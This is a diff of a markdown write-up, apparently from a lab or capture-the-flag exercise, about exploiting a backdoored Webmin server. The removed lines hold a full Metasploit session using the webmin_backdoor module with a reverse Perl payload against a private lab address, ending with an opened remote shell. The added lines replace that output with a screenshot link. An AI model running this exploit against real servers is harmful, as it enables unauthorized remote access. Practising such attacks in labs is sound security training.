@@ -40,76 +40,9 @@
 - We can then setup the exploit with the options for the victim server and run the exploit
 
 ![[webmin-setup.png]]
-```
-msf6 > use 0
-[*] Using configured payload cmd/unix/reverse_perl
-msf6 exploit(linux/http/webmin_backdoor) > show options
+![[webmin-run.png]]
 
-Module options (exploit/linux/http/webmin_backdoor):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
-   RPORT      10000            yes       The target port (TCP)
-   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT    8080             yes       The local port to listen on.
-   SSL        false            no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI  /                yes       Base path to Webmin
-   URIPATH                     no        The URI to use for this exploit (default is random)
-   VHOST                       no        HTTP server virtual host
-
-
-Payload options (cmd/unix/reverse_perl):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST                   yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic (Unix In-Memory)
-
-
-
-View the full module info with the info, or info -d command.
-
-msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.1.26.30
-RHOSTS => 10.1.26.30
-msf6 exploit(linux/http/webmin_backdoor) > set SSL true
-[!] Changing the SSL option's value may require changing RPORT!
-SSL => true
-msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.1.26.20
-LHOST => 10.1.26.20
-msf6 exploit(linux/http/webmin_backdoor) > run
-
-[*] Started reverse TCP handler on 10.1.26.20:4444
-[*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target is vulnerable.
-[*] Configuring Automatic (Unix In-Memory) target
-[*] Sending cmd/unix/reverse_perl command payload
-[*] Command shell session 2 opened (10.1.26.20:4444 -> 10.1.26.30:52474) at 2023-03-06 13:52:36 +0000
-```
-
-- This gives us a shell on the server, granted not the best shell in the world
-
-```
-[*] Sending cmd/unix/reverse_perl command payload
-[*] Command shell session 2 opened (10.1.26.20:4444 -> 10.1.26.30:52474) at 2023-03-06 13:52:36 +0000
-
-ls
-JSON
-LICENCE
-LICENCE.ja
-README
-WebminCore.pm
-WebminUI
-```
+- This gives us a root shell on the server, granted not the best shell in the world
 
 #### Upgrading the shell
 
